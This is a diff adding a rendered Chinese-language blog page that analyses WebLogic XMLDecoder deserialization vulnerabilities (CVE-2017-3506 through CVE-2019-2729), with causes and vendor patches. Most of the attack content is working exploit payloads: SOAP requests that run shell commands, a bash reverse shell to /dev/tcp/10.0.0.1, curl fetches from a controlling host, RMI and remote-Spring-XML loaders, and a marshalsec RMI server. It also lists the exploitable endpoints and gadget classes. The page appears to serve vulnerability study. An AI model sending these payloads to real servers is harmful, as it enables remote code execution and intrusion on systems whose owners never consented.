@@ -1,0 +1,555 @@
+I"�C<h4 id="weblogic-xmldecoder-反序列化漏洞">weblogic XMLDecoder 反序列化漏洞</h4>
+<p>CVE-2017-3506
+CVE-2017-10271
+CVE-2017-10352
+CVE-2019-2725
+CVE-2019-2729</p>
+<h4 id="cve-2017-3506">CVE-2017-3506</h4>
+<h5 id="漏洞原因">漏洞原因</h5>
+<p>反序列化数据可控，且对数据未进行任何过滤处理</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>public WorkContextXmlInputAdapter(InputStream var1){
+    this.xmlDecoder = new XMLDecoder(var1);
+}
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h5 id="poc">poc</h5>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td><td class="rouge-code"><pre>    &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+      &lt;soapenv:Header&gt;
+        &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
+          &lt;java&gt;
+            &lt;object class="java.lang.ProcessBuilder"&gt;
+              &lt;array class="java.lang.String" length="3"&gt;
+                &lt;void index="0"&gt;
+                  &lt;string&gt;/bin/bash&lt;/string&gt;
+                &lt;/void&gt;
+                &lt;void index="1"&gt;
+                  &lt;string&gt;-c&lt;/string&gt;
+                &lt;/void&gt;
+                &lt;void index="2"&gt;
+                  &lt;string&gt;whoami&lt;/string&gt;
+                &lt;/void&gt;
+              &lt;/array&gt;
+              &lt;void method="start"/&gt;
+            &lt;/object&gt;
+          &lt;/java&gt;
+        &lt;/work:WorkContext&gt;
+      &lt;/soapenv:Header&gt;
+      &lt;soapenv:Body/&gt;
+    &lt;/soapenv:Envelope&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h5 id="补丁">补丁</h5>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre>private void validate(InputStream is) {
+      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
+      try {
+         SAXParser parser = factory.newSAXParser();
+         parser.parse(is, new DefaultHandler() {
+            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
+               if(qName.equalsIgnoreCase("object")) {
+                  throw new IllegalStateException("Invalid context type: object");
+               }
+            }
+         });
+      } catch (ParserConfigurationException var5) {
+         throw new IllegalStateException("Parser Exception", var5);
+      } catch (SAXException var6) {
+         throw new IllegalStateException("Parser Exception", var6);
+      } catch (IOException var7) {
+         throw new IllegalStateException("Parser Exception", var7);
+      }
+   }
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>限制了object的使用</p>
+
+<h4 id="cve-2017-10271cve-2017-10352">CVE-2017-10271&amp;CVE-2017-10352</h4>
+<h5 id="漏洞原因-1">漏洞原因</h5>
+<p>只限制了object。
+未new, method, void，array等。</p>
+<h5 id="poc-1">poc</h5>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="rouge-code"><pre>&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;
+&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
+&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;
+&lt;void class="java.lang.ProcessBuilder"&gt;
+&lt;array class="java.lang.String" length="3"&gt;
+&lt;void index="0"&gt;
+&lt;string&gt;/bin/bash&lt;/string&gt;
+&lt;/void&gt;
+&lt;void index="1"&gt;
+&lt;string&gt;-c&lt;/string&gt;
+&lt;/void&gt;
+&lt;void index="2"&gt;
+&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/21 0&amp;gt;&amp;amp;1&lt;/string&gt;
+&lt;/void&gt;
+&lt;/array&gt;
+&lt;void method="start"/&gt;&lt;/void&gt;
+&lt;/java&gt;
+&lt;/work:WorkContext&gt;
+&lt;/soapenv:Header&gt;
+&lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h5 id="补丁-1">补丁</h5>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="rouge-code"><pre>private void validate(InputStream is) {
+   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
+   try {
+      SAXParser parser = factory.newSAXParser();
+      parser.parse(is, new DefaultHandler() {
+         private int overallarraylength = 0;
+         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
+            if(qName.equalsIgnoreCase("object")) {
+               throw new IllegalStateException("Invalid element qName:object");
+            } else if(qName.equalsIgnoreCase("new")) {
+               throw new IllegalStateException("Invalid element qName:new");
+            } else if(qName.equalsIgnoreCase("method")) {
+               throw new IllegalStateException("Invalid element qName:method");
+            } else {
+               if(qName.equalsIgnoreCase("void")) {
+                  for(int attClass = 0; attClass &lt; attributes.getLength(); ++attClass) {
+                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
+                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
+                     }
+                  }
+               }
+               if(qName.equalsIgnoreCase("array")) {
+                  String var9 = attributes.getValue("class");
+                  if(var9 != null &amp;&amp; !var9.equalsIgnoreCase("byte")) {
+                     throw new IllegalStateException("The value of class attribute is not valid for array element.");
+                  }
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>限制了object、new、method且viod只能使用index属性,array的class属性只能为byte</p>
+
+<h4 id="cve-2019-2725">cve-2019-2725</h4>
+<h5 id="漏洞原因-2">漏洞原因</h5>
+<p>未限制class</p>
+<h5 id="poc-2">poc</h5>
+
+<blockquote>
+  <p>weblogic12</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre></td><td class="rouge-code"><pre>POST /wls-wsat/CoordinatorPortType11;/../x HTTP/1.1
+Content-Type: text/xml
+SOAPAction: ""
+Content-Length: 824
+Host: 192.168.132.131
+User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
+Connection: close
+
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;
+  &lt;soapenv:Header&gt;
+    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt; &lt;class&gt;&lt;string&gt;org.slf4j.ext.EventData&lt;/string&gt;&lt;void&gt;&lt;string&gt;
+&lt;![CDATA[
+&lt;void class="java.lang.ProcessBuilder"&gt;
+&lt;array class="java.lang.String" length="3"&gt;
+&lt;void index="0"&gt;
+&lt;string&gt;/bin/bash&lt;/string&gt;
+&lt;/void&gt;
+&lt;void index="1"&gt;
+&lt;string&gt;-c&lt;/string&gt;
+&lt;/void&gt;
+&lt;void index="2"&gt;
+&lt;string&gt;curl http://192.168.132.1/ReadMe.txt&lt;/string&gt;
+&lt;/void&gt;
+&lt;/array&gt;
+&lt;void method="start"/&gt;&lt;/void&gt;
+]]&gt;
+&lt;/string&gt;&lt;/void&gt;&lt;/class&gt;
+    &lt;/work:WorkContext&gt;
+  &lt;/soapenv:Header&gt;
+  &lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>原理，未限制的使用class，可以生成java实例，EventData构造函数中存在2次反序列化操作。使用class绕过限制，并将函数调用等攻击语句放入string中，绕过检测</p>
+
+<blockquote>
+  <p>weblogic10</p>
+</blockquote>
+
+<p>使用UnitOfWorkChangeSet类进行2次反序列化，传入参数为byte[]，且array可使用byte</p>
+
+<blockquote>
+  <p>通用</p>
+</blockquote>
+
+<p>payload</p>
+
+<blockquote>
+  <p>rmi类型</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;
+  &lt;soapenv:Header&gt;
+    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt; &lt;java&gt;&lt;class&gt;&lt;string&gt;com.sun.rowset.JdbcRowSetImpl&lt;/string&gt;&lt;void&gt;
+&lt;property name="dataSourceName"&gt;&lt;string&gt;rmi://192.168.132.1:9998/aa&lt;/string&gt;&lt;/property&gt;&lt;property name="autoCommit"&gt;&lt;boolean&gt;true&lt;/boolean&gt;&lt;/property&gt;
+&lt;/void&gt;&lt;/class&gt;
+&lt;/java&gt;
+ &lt;/work:WorkContext&gt;
+ &lt;/soapenv:Header&gt; &lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="rouge-code"><pre>import com.google.inject.internal.cglib.core.$CodeGenerationException;
+import marshalsec.jndi.RMIRefServer;
+
+import java.io.IOException;
+import java.net.URL;
+
+public class test {
+    public static void main(String[] args) {
+        try{
+            URL url=new URL("http://192.168.132.1/#Exploit");
+            RMIRefServer RMIRefServer=new RMIRefServer(9998,url);
+            RMIRefServer.run();
+        }
+        catch(IOException e ){
+            return;
+        }
+    }
+}
+
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p>ClassPathXmlApplicationContext类</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre>POST /wls-wsat/CoordinatorPortType11;/../x HTTP/1.1
+Content-Type: text/xml
+SOAPAction: ""
+Content-Length: 585
+Host: 192.168.132.131
+User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
+Connection: close
+
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;
+  &lt;soapenv:Header&gt;
+    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt; &lt;class&gt;&lt;string&gt;com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext&lt;/string&gt;&lt;void&gt;&lt;string&gt;
+http://192.168.132.1/1.xml
+&lt;/string&gt;&lt;/void&gt;&lt;/class&gt;
+    &lt;/work:WorkContext&gt;
+  &lt;/soapenv:Header&gt;
+  &lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p>FileSystemXmlApplicationContext类</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre>POST /wls-wsat/CoordinatorPortType11;/../x HTTP/1.1
+Content-Type: text/xml
+SOAPAction: ""
+Content-Length: 586
+Host: 192.168.132.131
+User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
+Connection: close
+
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;
+  &lt;soapenv:Header&gt;
+    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt; &lt;class&gt;&lt;string&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;/string&gt;&lt;void&gt;&lt;string&gt;
+http://192.168.132.1/1.xml
+&lt;/string&gt;&lt;/void&gt;&lt;/class&gt;
+    &lt;/work:WorkContext&gt;
+  &lt;/soapenv:Header&gt;
+  &lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p>恶意xml</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;
+  &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt;
+    &lt;constructor-arg&gt;
+      &lt;list&gt;
+        &lt;value&gt;/bin/bash&lt;/value&gt;
+        &lt;value&gt;-c&lt;/value&gt;
+        &lt;value&gt;&lt;![CDATA[curl http://192.168.132.1/ReadMe.txt]]&gt;&lt;/value&gt;
+      &lt;/list&gt;
+    &lt;/constructor-arg&gt;
+  &lt;/bean&gt;
+&lt;/beans&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>原理使用class创建java实例，使用ClassPathXmlApplicationContext或者FileSystemXmlApplicationContext加载远程xml文件，生成been，在xml中使用init-method设定初始化函数。
+<img src="image/1.gif" alt="" /></p>
+
+<h5 id="补丁-2">补丁</h5>
+<p>将class加入黑名单</p>
+
+<h4 id="cve-2019-2729">cve-2019-2729</h4>
+<h5 id="漏洞原因-3">漏洞原因</h5>
+<p>在JDK1.6中可使用<code class="language-plaintext highlighter-rouge">&lt;array method =“forName”&gt;</code>获取java实例。</p>
+<h5 id="poc-3">poc</h5>
+<p>将cve-2019-2725中<code class="language-plaintext highlighter-rouge">class</code>替换为<code class="language-plaintext highlighter-rouge">&lt;array method =“forName”&gt;</code></p>
+<h5 id="补丁-3">补丁</h5>
+<p>允许
+无属性：string、int、long、byte、boolean、short、char、float、double
+array标签：class=byte、以及length属性
+void标签：index属性
+java标签：class=java.beans.XMLDecoder、以及version属性</p>
+
+<h4 id="other">other</h4>
+<h5 id="攻击入口总结">攻击入口总结</h5>
+
+<blockquote>
+  <p>/_async/AsyncResponseService</p>
+</blockquote>
+
+<p>利用时需设置</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>&lt;ads:Action&gt;&lt;/ads:Action&gt;
+&lt;ads:RelatesTo&gt;&lt;/ads:RelatesTo&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p>/wls-wsat/CoordinatorPortType</p>
+</blockquote>
+
+<h5 id="可利用类总结">可利用类总结</h5>
+
+<blockquote>
+  <p>oracle.toplink.internal.sessions.UnitOfWorkChangeSet（weblogic 10.3.6）</p>
+</blockquote>
+
+<p>二次反序列化，传入参数为byte[]，且array可使用byte</p>
+
+<blockquote>
+  <p>org.slf4j.ext.EventData（weblogic 12.1.3）</p>
+</blockquote>
+
+<p>二次反序列化，传入参数为string，进入构造函数，直接进行反序列化处理</p>
+
+<blockquote>
+  <p>com.sun.rowset.JdbcRowSetImpl（需要可以外联）</p>
+</blockquote>
+
+<p>rmi加载远程攻击类</p>
+
+<blockquote>
+  <p>ClassPathXmlApplicationContext、FileSystemXmlApplicationContext（需要可以外联）</p>
+</blockquote>
+
+<p>加载远程xml文件，生成been，在xml中使用init-method设定初始化函数。</p>
+
+<p>参考文章：
+https://paper.seebug.org/487/
+https://www.freebuf.com/vuls/178510.html
+https://mp.weixin.qq.com/s/qxkV_7MZVhUYYq5QGcwCtQ
+https://www.freebuf.com/column/203859.html
+https://mp.weixin.qq.com/s/QYrPrctdDJl6sgcKGHdZ7g
+https://www.freebuf.com/vuls/202800.html
+http://xxlegend.com/2018/10/23/Weblogic%20CVE-2018-3191%E5%88%86%E6%9E%90/
+https://paper.seebug.org/623/
+https://www.cnblogs.com/JoeyWong/p/9304913.html
+http://www.heibai.org/post/1359.html
+http://www.heibai.org/post/1367.html
+https://xz.aliyun.com/t/5496</p>
+:ET
